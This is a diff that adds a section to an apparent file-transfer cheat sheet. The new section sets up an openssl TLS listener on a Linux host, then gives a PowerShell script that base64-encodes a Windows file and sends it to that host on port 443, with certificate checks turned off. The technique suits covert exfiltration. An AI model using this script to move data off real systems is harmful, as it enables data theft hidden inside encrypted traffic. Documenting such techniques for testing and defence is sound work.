@@ -1071,3 +1071,29 @@ $writer.WriteLine($fdata);
 $writer.flush();
 $socket.close();
 ```
+
+**Send file over a TLS socket**
+
+Start openssl server on Linux (10.192.103.49).<br />
+Generate a certificate and key first.<br />
+`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`
+
+`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 | fold -w 76 | base64 -di > file.bin`
+
+Send the file from Windows host using powershell.<br />
+```powershell
+$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
+$socket = New-Object net.sockets.tcpclient('10.192.103.49', 443);
+$stream = $socket.GetStream();
+$callback = { param($sender, $cert, $chain, $errors) return $true };
+$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
+$sslstream.AuthenticateAsClient("whatever");
+$stream = $sslstream;
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$writer.WriteLine($fdata);
+$writer.flush();
+$writer.close();
+$stream.close();
+$socket.close();
+```
